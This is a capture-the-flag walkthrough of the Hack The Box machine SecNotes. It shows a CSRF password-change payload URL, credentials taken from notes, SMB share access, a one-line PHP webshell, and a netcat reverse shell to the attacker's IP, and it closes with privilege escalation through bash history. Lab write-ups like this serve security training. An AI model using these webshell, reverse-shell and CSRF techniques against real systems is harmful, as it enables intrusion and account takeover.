---
icon: windows
---

# SecNotes - Medium

<figure><img src="../../.gitbook/assets/image (15) (1) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/secnotes"><strong>SecNotes</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```shellscript
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.97 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 11:09 EST
Nmap scan report for 10.10.10.97
Host is up (0.041s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 2019 (90%), Microsoft Windows 10 1803 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00                                                                                                             
|   Workgroup: HTB\x00                                                                                                                              
|_  System time: 2025-11-29T08:12:03-08:00                                                                                                          
| smb2-security-mode:                                                                                                                               
|   3:1:1:                                                                                                                                          
|_    Message signing enabled but not required                                                                                                      
| smb-security-mode:                                                                                                                                
|   account_used: <blank>                                                                                                                           
|   authentication_level: user                                                                                                                      
|   challenge_response: supported                                                                                                                   
|_  message_signing: disabled (dangerous, but default)                                                                                              
| smb2-time:                                                                                                                                        
|   date: 2025-11-29T16:12:05                                                                                                                       
|_  start_date: N/A                                                                                                                                 
|_clock-skew: mean: 2h40m05s, deviation: 4h37m08s, median: 4s                                                                                       
                                                                                                                                                    
TRACEROUTE (using port 445/tcp)                                                                                                                     
HOP RTT      ADDRESS                                                                                                                                
1   52.17 ms 10.10.16.1                                                                                                                             
2   52.40 ms 10.10.10.97
```

### <mark style="color:$primary;">HTTP Port 8808 TCP</mark>

<figure><img src="../../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>

This is a default Microsoft IIS page! Nothing else here so i will move on

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Visiting the site we are redirected to `/login.php` , let's register an account and login!

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After logging you will be redirected to `/home.php`

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The first comment stands out immediately, it seems people were storing PII \[Personal Identifiable Information] in there notes we also see the admin's account `tyler@secnotes.htb`

### <mark style="color:$primary;">Change Password FORM</mark>

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><strong>Change Password Button redirect</strong></p></figcaption></figure>

This form does not request the current password before changing it. After submitting the new password to `/change_pass.php` we are redirected to `/home.php` with a message saying that the password was changed.&#x20;

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Capturing the request in Burp Suite I was able to modify the request from **POST** to **GET** and it still worked&#x20;

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Contact Us FORM</mark>

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I tried including a link in the message to see if it gets clicked and to my surprised it was!

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">CSRF || XSRF</mark>

#### What is CSRF?

A Cross-Site Request Forgery (XSRF) is also known as “one-click attack” and “session riding”. The idea is that an attacker can craft a url such that when a target visits it, some actions or commands are taken that the user may not have wanted to take. For a site that’s vulnerable to XSRF, this can be a nasty attack, since the attacker can control the text of the link they send the target, making it not too hard to trick people into clicking on links.

This is an old attack vector, but one that’s still around today. Techcrunch just published an [article](https://techcrunch.com/2019/01/14/web-hosting-account-hacks/) on 14 January about how many web hosting sites were vulnerable to account takeover via XSRF.

XSRF is easily defeated by including POST parameters such as a token in the form that generates the request which would not be replicated in the link passed to the target.

### Attack

The combination of the `/change_pass.php` accepting GET and not requiring the current password, and my ability to get someone to click on links in the `/contact.php` page provides an opportunity for a Cross-Site Request Forgery (XSRF) attack.

I’ll include url to change the password in the message, and then another for our local host, when I see a callback, I can try to log in as tyler.

Message to send:

```shellscript
http://10.10.10.97/change_pass.php?password=password123&confirm_password=password123&submit=submit
http://10.10.16.2/complete
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After sending wait for a bit and you should see a hit on your nc listener.

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Once you see the hit, try logging in as **tyler:password123**

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Clicking on the 3rd note we discover some Credentials

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
tyler / 92g!mA8BGjOirkL%OG*&
```

```shellscript
netexec smb 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&' --shares
```

<figure><img src="../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tyler has read & write access on the new site!

{% code overflow="wrap" %}
```shellscript
smbclient \\\\10.10.10.97\\new-site -U 'tyler%92g!mA8BGjOirkL%OG*&'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>

Connecting to the share we find the root directory of the default IIS site we discovered on port 8808!&#x20;

### <mark style="color:$primary;">Failed aspx Webshell</mark>

To run commands, I’ll download [this aspx webshell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx) from GitHub and upload it over SMB

<figure><img src="../../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>

I cannot seem to get aspx code to run and I saw that there is a scheduler running in the background that is cleaning the share every 2, 3 minutes.

I'll try something different.

### <mark style="color:$primary;">Shell via php</mark>

```shellscript
echo '<?php system($_REQUEST['cmd']); ?>' > cmd.php
```

Now place `cmd.php` and `nc64.exe` into the smb share

<figure><img src="../../.gitbook/assets/image (21) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now make sure you have a listener ready on your designated port then run the following command

{% code overflow="wrap" %}
```shellscript
curl "http://10.10.10.97:8808/cmd.php?cmd=nc64.exe+-e+cmd.exe+10.10.16.2+8808"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (22) (1) (1).png" alt=""><figcaption></figcaption></figure>

We managed to get a shell as tyler!

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

Inside tyler's Desktop Directory there is a shortcut to <mark style="color:$primary;">**bash**</mark>&#x20;

<figure><img src="../../.gitbook/assets/image (23) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (24) (1) (1).png" alt=""><figcaption></figcaption></figure>

the shrtcut reveals the path to bash.exe and running gives us a root shell in the Ubuntu sandbox

```shellscript
C:\Windows\System32\bash.exe
```

<figure><img src="../../.gitbook/assets/image (25) (1) (1).png" alt=""><figcaption></figcaption></figure>

Improve shell using

```shellscript
python -c 'import pty;pty.spawn("/bin/bash")'
```

running the history command I come across the administrator's credentials

<figure><img src="../../.gitbook/assets/image (26) (1) (1).png" alt=""><figcaption></figcaption></figure>

Let's test them and try to get a shell as administrator

<figure><img src="../../.gitbook/assets/image (27) (1) (1).png" alt=""><figcaption></figcaption></figure>
